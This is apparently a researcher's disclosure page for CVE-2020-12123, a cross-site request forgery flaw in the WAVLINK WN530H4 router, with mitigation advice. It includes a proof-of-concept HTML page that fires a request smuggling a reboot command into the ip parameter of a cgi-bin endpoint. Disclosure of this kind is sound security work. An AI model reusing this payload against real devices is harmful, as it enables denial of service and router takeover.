---
year: 2020
cveid: CVE-2020-12123
title: CVE-2020-12123
product: "WAVLINK WN530H4"
vulnerability: "Cross Site Request Forgery (CSRF)"
publish: true
category: bugs
layout: bug-report
---

This vulnerability is a Cross-Site Request Forgery (CSRF) in the WAVLINK WN530H4 router.

Many endpoints in the web interface <kbd>/cgi-bin/</kbd> directory are vulnerable to CSRF. This effectively allows other websites to submit requests to the router page without the user knowing – even if the router manufacturers patch the cgi-bin authentication bypass (however, the attack will only work if the admin is logged in).

Malicious websites with hoards of router vulnerabilities could create traps on the Internet with maliciously-crafted websites that trigger vulnerabilities in the router. As an example, consider this malicious HTML page.

<pre>
<code>&#x3C;html&#x3E;
    &#x3C;head&#x3E;
        &#x3C;title&#x3E;Reboot!&#x3C;/title&#x3E;
        &#x3C;script src = &#x22;http://192.168.10.1/cgi-bin/live_api.cgi?page=hacked&#x26;id=1337&#x26;ip=;reboot;&#x22;&#x3E;&#x3C;/script&#x3E;
   &#x3C;/head&#x3E;
   &#x3C;body&#x3E;
       &#x3C;h1&#x3E;This webpage reboots the WAVLINK router.&#x3C;/h1&#x3E;
   &#x3C;/body&#x3E;
&#x3C;/html&#x3E;</code>
</pre>

This malicious HTML exploits the command line injection vulnerability "remotely" by rebooting the router (effectively causing a denial of service). An unsuspecting user could succumb themselves to this attack if they click a link with this vulnerable code. Of course, many more vulnerable attacks can be executed – including malicious binaries being downloaded remotely and executed.

To solve this, the router must employ protections. One such protection is employing anti-forgery tokens. It seems that the router manufacturers try this by protecting most of the webpages with a token, but none of the cgi-bin endpoints are protected by this, rendering this defense useless.

For more information and vulnerability analysis, please see [my report on the WAVLINK WN530H4]({{"/assets/reports/report_wavlink.pdf" | relative_url}}).
